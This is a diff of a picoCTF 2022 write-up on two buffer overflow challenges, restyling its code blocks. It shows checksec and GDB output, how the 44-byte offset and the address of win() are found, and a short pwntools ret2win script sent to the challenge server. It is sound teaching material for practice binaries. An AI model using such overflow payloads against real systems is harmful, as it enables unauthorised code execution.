@@ -24,6 +24,7 @@ thumbnail: /asset/banner/banner-buffer-overflow.png
         margin-top: 1rem;
         margin-bottom: 1rem;
     }
+
     .flex-container {
         display: flex;
         flex-wrap: nowrap;
@@ -40,6 +41,26 @@ This is a writeup for the buffer overflow series during the **picoCTF 2022** com
 <div class="box">
   Smash the stack! Let's start off simple: can you overflow the correct buffer? The program is available <a href="/asset/pico/buffer-overflow-0-1/vuln-0">here</a>. You can view source <a href="/asset/pico/buffer-overflow-0-1/vuln-0.c">here</a>, and connect with it using:<br><code>nc saturn.picoctf.net 65535</code>
 </div>
+
+<figure class="highlight console">
+  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
+      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
+  <table>
+    <tr>
+      <td class="code">
+        <pre><span class="meta prompt_">$ </span> checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-0/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#5EBDAB">Full RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#5EBDAB">PIE enabled</span>
+</pre>
+      </td>
+    </tr>
+  </table>
+</figure>
+
 
 Let's analyze this `.c` file we have as reference:
 
@@ -107,11 +128,16 @@ Researching online, a "SIGSEGV" stands for a **segmentation fault**, which is an
 
 We see that on line 40, the horrible `gets()` is called, and reads `buf1` (the user input) onto the stack. This function sucks, as it will write the user's input to the stack without regard to its allocated length. The user can simply overflow this length, and the program will pass their input into the `vuln()` function to trigger a segmentation fault:
 
-```text
-$ nc saturn.picoctf.net 65535
-Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa
-picoCTF{ov3rfl0ws_ar3nt_that_bad_********}
-```
+<figure class="highlight console">
+  <table>
+    <tr>
+      <td class="code">
+        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc saturn.picoctf.net 65535</span></span><br><span class="line">Input: aaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">picoCTF{ov3rfl0ws_ar3nt_that_bad_<span style="color:#696969"><b>[REDACTED]</b></span>}</span><br></pre>
+      </td>
+    </tr>
+  </table>
+</figure>
+
 
 ---
 
@@ -121,6 +147,19 @@ picoCTF{ov3rfl0ws_ar3nt_that_bad_********}
   Control the return address.<br>
   Now we're cooking! You can overflow the buffer and return to the flag function in the <a href="javascript:;">program</a>. You can view source <a href="javascript:;">here</a>. And connect with it using:<br> <code>nc saturn.picoctf.net [PORT]</code></a>
 </div>
+
+<figure class="highlight console">
+  <figcaption><span>checksec.sh</span><a target="_blank" rel="noopener"
+      href="https://github.com/slimm609/checksec.sh"><span style="color:#82C4E4">github link</span></a></figcaption>
+<table><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-1/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#D41919">NX disabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+    RWX:      <span style="color:#D41919">Has RWX segments</span>
+</pre></td></tr></table></figure>
 
 Let's check out our source code:
 
@@ -188,124 +227,151 @@ If we are delibrate of the characters we pass into `gets()`, we will be able to 
 
 To start, we first need to figure out our "offset". The offset is the distance, in characters, between the beginning of the buffer and the position of the `$eip`. This can be visualized with the `gdb-gef` utility by setting a breakpoint (a place to pause the runtime) in the `main()` function:
 
-```text
-gef➤  b main
-Breakpoint 1 at 0x80492d7
-gef➤  r
-Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
-
-Breakpoint 1, 0x080492d7 in main ()
-───────────────────────────────────────────────────────────────── registers ────
-$eax   : 0xf7fa89e8  →  0xffffd1cc  →  0xffffd39c  →  "SHELL=/usr/bin/bash"
-$ebx   : 0x0       
-$ecx   : 0xffffd120  →  0x00000001
-$edx   : 0xffffd154  →  0x00000000
-$esp   : 0xffffd100  →  0xffffd120  →  0x00000001
-$ebp   : 0xffffd108  →  0x00000000
-$esi   : 0x1       
-$edi   : 0x80490e0  →  <_start+0> endbr32 
-$eip   : 0x80492d7  →  <main+19> sub esp, 0x10
-...
-─────────────────────────────────────────────────────────────── code:x86:32 ────
-    0x80492d3 <main+15>        mov    ebp, esp
-    0x80492d5 <main+17>        push   ebx
-    0x80492d6 <main+18>        push   ecx
- →  0x80492d7 <main+19>        sub    esp, 0x10
-    0x80492da <main+22>        call   0x8049130 <__x86.get_pc_thunk.bx>
-    0x80492df <main+27>        add    ebx, 0x2d21
-    0x80492e5 <main+33>        mov    eax, DWORD PTR [ebx-0x4]
-    0x80492eb <main+39>        mov    eax, DWORD PTR [eax]
-    0x80492ed <main+41>        push   0x0
-─────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "vuln", stopped 0x80492d7 in main (), reason: BREAKPOINT
-```
+<figure class="highlight text">
+  <figcaption><span>GEF - "GDB enhanced features"</span><a target="_blank" rel="noopener"
+      href="https://gef.readthedocs.io/en/master/"><span style="color:#82C4E4">documentation</span></a></figcaption>
+<table><tr><td class="code"><pre><span style="color:#EC0101"><b>gef➤  </b></span>b main
+Breakpoint 1 at <span style="color:#367BF0">0x80492d7</span>
+<span style="color:#EC0101"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
+Breakpoint 1, <span style="color:#367BF0">0x080492d7</span> in <span style="color:#FEA44C">main</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0xf7fa39e8  →  <span style="color:#9755B3">0xffffd20c</span>  →  <span style="color:#9755B3">0xffffd3d1</span>  →  <span style="color:#FEA44C">"SHELL=/usr/bin/bash"</span>
+<span style="color:#367BF0">$ebx   </span>: 0x0       
+<span style="color:#EC0101"><b>$ecx   </b></span>: <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
+<span style="color:#EC0101"><b>$edx   </b></span>: <span style="color:#9755B3">0xffffd194</span>  →  0x00000000
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd140</span>  →  <span style="color:#9755B3">0xffffd160</span>  →  0x00000001
+<span style="color:#EC0101"><b>$ebp   </b></span>: <span style="color:#9755B3">0xffffd148</span>  →  0x00000000
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: <span style="color:#D41919">0x80492d7</span>  →  <span style="color:#585858"><b>&lt;main+19&gt; sub esp, 0x10</b></span>
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+   <span style="color:#585858"><b> 0x80492d3 &lt;main+15&gt;        mov    ebp, esp</b></span>
+   <span style="color:#585858"><b> 0x80492d5 &lt;main+17&gt;        push   ebx</b></span>
+   <span style="color:#585858"><b> 0x80492d6 &lt;main+18&gt;        push   ecx</b></span>
+ <span style="color:#5EBDAB">→  0x80492d7 &lt;main+19&gt;        sub    esp, 0x10</span>
+    0x80492da &lt;main+22&gt;        call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;
+    0x80492df &lt;main+27&gt;        add    ebx, 0x2d21
+    0x80492e5 &lt;main+33&gt;        mov    eax, DWORD PTR [ebx-0x4]
+    0x80492eb &lt;main+39&gt;        mov    eax, DWORD PTR [eax]
+    0x80492ed &lt;main+41&gt;        push   0x0
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x80492d7</span> in <span style="color:#FF8A18"><b>main</b></span> (), reason: <span style="color:#962AC3"><b>BREAKPOINT</b></span></pre></td></tr></table></figure>
 
 Analyzing this breakpoint, if you look at the arrow on the assembly code, you can see that its address is the exact same as the `$eip` (`0x80492d7`). Let's try overflowing this register by passing an unhealthy amount of `A`s into the program:
 
-```text
-gef➤  r
-Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
+<figure class="highlight text"><table> <tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
 Please enter your string: 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Okay, time to return... Fingers Crossed... Jumping to 0x41414141
 
 Program received signal SIGSEGV, Segmentation fault.
-0x41414141 in ?? ()
-───────────────────────────────────────────────────────────────── registers ────
-$eax   : 0x41      
-$ebx   : 0x41414141 ("AAAA"?)
-$ecx   : 0x41      
-$edx   : 0xffffffff
-$esp   : 0xffffd0f0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
-$ebp   : 0x41414141 ("AAAA"?)
-$esi   : 0x1       
-$edi   : 0x80490e0  →  <_start+0> endbr32 
-$eip   : 0x41414141 ("AAAA"?)
-...
-─────────────────────────────────────────────────────────────── code:x86:32 ────
-[!] Cannot disassemble from $PC
-[!] Cannot access memory at address 0x41414141
-─────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "vuln", stopped 0x41414141 in ?? (), reason: SIGSEGV
-```
+<span style="color:#367BF0">0x41414141</span> in <span style="color:#FEA44C">??</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
+<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x41414141
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x41414141</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></figure>
 
-Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address `0x41414141`, which doesn't exist! This is because our `$eip` was overwritten by all our `A`s (`0x41` in ASCII = `A` in text).
+<div style="margin-top:-2.5%; margin-bottom:2.5%;">Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address <code>0x41414141</code>, which doesn&#39;t exist! This is because our <code>$eip</code> was overwritten by all our <code>A</code>s (<code>0x41</code> in ASCII = <code>A</code> in text).</div>
 
 ### Part III: Smashing the Stack (with finesse)
 
 Although we've managed to smash the stack, we still dont' know the offset (**how many** `A`s we need to pass in order to reach the `$eip`). To solve this problem, we can use the pwntools `cyclic` command, which creates a string with a recognizable cycling pattern for it to identify:
 
-```text
-gef➤  shell cyclic 150
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
-gef➤  r
-Starting program: /home/kali/pico22/buffer-overflow-1/vuln 
+<figure class="highlight text"><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
+<span style="color:#47D4B9"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
 Please enter your string: 
-aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
 Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
 
 Program received signal SIGSEGV, Segmentation fault.
-0x6161616c in ?? ()
-───────────────────────────────────────────────────────────────── registers ────
-$eax   : 0x41      
-$ebx   : 0x6161616a ("jaaa"?)
-$ecx   : 0x41      
-$edx   : 0xffffffff
-$esp   : 0xffffd0f0  →  "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
-$ebp   : 0x6161616b ("kaaa"?)
-$esi   : 0x1       
-$edi   : 0x80490e0  →  <_start+0> endbr32 
-$eip   : 0x6161616c ("laaa"?)
-...
-─────────────────────────────────────────────────────────────── code:x86:32 ────
-[!] Cannot disassemble from $PC
-[!] Cannot access memory at address 0x6161616c
-─────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
-```
+<span style="color:#367BF0">0x6161616c</span> in <span style="color:#FEA44C">??</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$ebx   </b></span>: 0x6161616a (&quot;<span style="color:#FEA44C">jaaa</span>&quot;?)
+<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  0x00000000
+<span style="color:#EC0101"><b>$ebp   </b></span>: 0x6161616b (&quot;<span style="color:#FEA44C">kaaa</span>&quot;?)
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: 0x6161616c (&quot;<span style="color:#FEA44C">laaa</span>&quot;?)
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
+<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x6161616c
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: &quot;vuln&quot;, <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x6161616c</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span>
+</pre></td></tr></table></figure>
 
-We can see that `$eip` is currently overflowed with the pattern `0x6161616c` (`laaa`). let's search for this pattern using `pattern search`:
+<div style="margin-top:-2.5%; margin-bottom:2.5%">We can see that <code>$eip</code> is currently overflowed with the pattern <code>0x6161616c</code> (<code>laaa</code>). let&#39;s search for this pattern using <code>pattern search</code>:</div>
 
-```text
-gef➤  pattern search 0x6161616c
-[+] Searching for '0x6161616c'
-[+] Found at offset 44 (little-endian search) likely
-[+] Found at offset 41 (big-endian search)
-```
+<figure class="highlight plaintext">
+  <figcaption><span>GEF pattern command</span><a target="_blank" rel="noopener"
+      href="https://gef.readthedocs.io/en/master/commands/pattern/"><span style="color:#82C4E4">documentation</span></a></figcaption>
+  <table>
+    <tr>
+      <td class="code">
+        <pre><span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
+<span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
+<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
+<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 41 (big-endian search) 
+</pre>
+      </td>
+    </tr>
+  </table>
+</figure>
+
 
 To figure out which offset we need to use, we can use `readelf` to analyze header of the `vuln` executable:
 
-```text
-kali@kali:~/pico22/buffer-overflow-1$ readelf -h vuln | grep endian
-  Data:                              2's complement, little endian
-```
+<figure class="highlight console">
+  <figcaption><span>readelf command</span><a target="_blank" rel="noopener"
+      href="https://man7.org/linux/man-pages/man1/readelf.1.html"><span style="color:#82C4E4">documentation</span></a></figcaption>
+  <table>
+    <tr>
+      <td class="code">
+        <pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span><br></pre>
+      </td>
+    </tr>
+  </table>
+</figure>
+
 
 Our binary is in little endian, we know that 44 `A`s are needed in order to reach the `$eip`. The only thing we need now before we create our exploit is the address of the `win()` function, which will be appended to the end of our buffer to overwrite the `$eip` on the stack:
 
-```text
-gef➤  x win
-0x80491f6 <win>: 0xfb1e0ff3
-```
+<figure class="highlight text">
+  <figcaption><span>GDB x command</span><a target="_blank" rel="noopener"
+      href="https://visualgdb.com/gdbreference/commands/x"><span style="color:#82C4E4">documentation</span></a></figcaption>
+  <table>
+    <tr>
+      <td class="code">
+<pre><span style="color:#47D4B9"><b>gef➤  </b></span>x win
+<span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3
+</pre>      </td>
+    </tr>
+  </table>
+</figure>
+
 
 Win is at `0x80491f6`, but we need to convert it to the little endian format. You can do this with the pwntools `p32()` command, which results in `\xf6\x91\x04\x08`.
 Let's make a final visual of our payload:
@@ -314,29 +380,28 @@ Let's make a final visual of our payload:
 
 Let's write our payload and send it to the remote server with Python3/pwntools:
 
-```py
-from pwn import *
-payload = b"A"*44 + p32(0x80491f6)        # Prints the address as little endian (b'\xf6\x91\x04\x08').
-host, port = "saturn.picoctf.net", [PORT]
-
-p = remote(host, port)                    # Opens the connection
-log.info(p.recvS())                       # Decodes/prints "Please enter your string:"
-p.sendline(payload)                       # Sends the payload
-log.success(p.recvallS())                 # Decodes/prints all program outputs
-p.close()                                 # Closes the connection
-```
+<figure class="highlight py">
+  <figcaption><span>buffer-overflow-1.py</span><a target="_blank" rel="noopener"
+      href="https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394"><span style="color:#82C4E4">github gist link</span></a></figcaption>
+  <table><tr><td class="gutter">
+        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
+      </td>
+      <td class="code">
+        <pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">44</span> + p32(<span class="number">0x80491f6</span>)  <span class="comment"># Little endian: b&#x27;\xf6\x91\x04\x08&#x27;</span></span><br><span class="line">host, port = <span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT]</span><br><span class="line"></span><br><span class="line">p = remote(host, port)      <span class="comment"># Opens the connection</span></span><br><span class="line">log.info(p.recvS())         <span class="comment"># Decodes/prints &quot;Please enter your string:&quot;</span></span><br><span class="line">p.sendline(payload)         <span class="comment"># Sends the payload</span></span><br><span class="line">log.success(p.recvallS())   <span class="comment"># Decodes/prints all program outputs</span></span><br><span class="line">p.close()                   <span class="comment"># Closes the connection</span></span><br></pre>
+</td></tr></table></figure>
 
 Let's try running the script on the server:
 
-```text
-kali@kali:~/pico22/buffer-overflow-1$ python3 exp.py
-[+] Opening connection to saturn.picoctf.net on port [PORT]: Done
-[*] Please enter your string: 
-[+] Receiving all data: Done (100B)
-[*] Closed connection to saturn.picoctf.net port [PORT]
-[+] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
-    picoCTF{addr3ss3s_ar3_3asy_********}
-```
+<figure class="highlight text"><table><tr><td class="code">
+<pre><span class="meta prompt_">$ </span>python3 exp2.py
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
+[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}
+</pre></td></tr></table></figure>
+
 
 You have completed your first `ret2win` buffer overflow on a x32 binary!
 
